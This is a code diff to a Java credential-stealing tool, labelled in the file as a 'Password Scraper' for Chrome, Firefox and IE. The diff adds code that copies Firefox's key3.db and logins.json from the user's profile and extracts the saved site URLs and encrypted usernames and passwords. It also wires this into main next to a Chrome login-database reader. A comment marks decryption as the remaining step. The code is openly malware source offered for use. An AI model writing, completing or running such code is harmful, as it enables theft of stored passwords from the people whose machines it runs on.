@@ -8,12 +8,18 @@ import java.io.File;
 
 import java.io.IOException;
 import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.PrintStream;
 import java.sql.DriverManager;
 import java.sql.Connection;
 import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.sql.Statement;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+import org.json.simple.parser.JSONParser;
+import org.json.simple.parser.ParseException;
 
 // Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
 
@@ -41,10 +47,10 @@ public class jdec extends Crypt32Util {
 		Statement stmt2 = conn.createStatement();
 		Statement stmt3 = conn.createStatement();
 		Statement stmt4 = conn.createStatement();
-		String sqlurls = "SELECT origin_url FROM logins ORDER BY username_value";
+		String sqlurls = "SELECT origin_url FROM logins ";
 		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
 		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
-		String count = "SELECT COUNT(username_value) FROM logins ORDER BY username_value";
+		String count = "SELECT COUNT(username_value) FROM logins";
 		ResultSet dbcount = stmt4.executeQuery(count);
 		int cint = dbcount.getInt(1);
 	
@@ -102,7 +108,7 @@ public class jdec extends Crypt32Util {
 		}
 	}
 	
-	public void FirefoxDec() throws IOException {
+	public static void FirefoxDec() throws IOException, ParseException {
 		
 		// Get username
 		String user = System.getProperty("user.name");
@@ -120,21 +126,54 @@ public class jdec extends Crypt32Util {
 		}
 	
 		// Get Key File
-		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "key3.db");
+		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
 		File firefoxdest = FileUtils.getFile("key3.db");
 		FileUtils.copyFile(firefox, firefoxdest);
 		
-		// WIP -- More to come soon
+		// Get JSON file, hashes in plaintext
+		File firefoxjson = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/logins.json");
+		File firefoxjdest = FileUtils.getFile("logins.json");
+		FileUtils.copyFile(firefoxjson, firefoxjdest);
+		
+		// Parse
+		JSONParser parser = new JSONParser();
+		Object jffobj = parser.parse(new FileReader("logins.json"));
+		String ffdata = jffobj.toString();
+		JSONObject ffobj = new JSONObject(ffdata);
+		JSONArray logins = ffobj.getJSONArray("logins");
+		
+		// Put into arrays
+		ArrayList<String> ffurls = new ArrayList<String>();
+		ArrayList<String> ffencryptedusernames = new ArrayList<String>();
+		ArrayList<String> ffencryptedpasswords = new ArrayList<String>();
+		
+		// Get websites
+		for(int j = 0; j < logins.length(); j++){
+			ffurls.add(logins.getJSONObject(j).getString("hostname"));
+		}
+		
+		// Get encrypted usernames
+		for(int j = 0; j < logins.length(); j++){
+			ffencryptedusernames.add(logins.getJSONObject(j).getString("encryptedUsername"));
+		}
+		
+		// Get encrypted passwords
+		for(int j = 0; j < logins.length(); j++){
+			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
+		}
+		
+		// -- Need to import JSS jar and use SunPKCS11 to decrypt username/passwords with key3.db and function
 		
 	}
 	
-	public static void main(String[] args) throws SQLException, IOException {
+	public static void main(String[] args) throws SQLException, IOException, ParseException {
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
 		System.setOut(out);
 		
 		ChromeDec();
-		
+		FirefoxDec();
+		System.out.println("Done");
 	}
 }
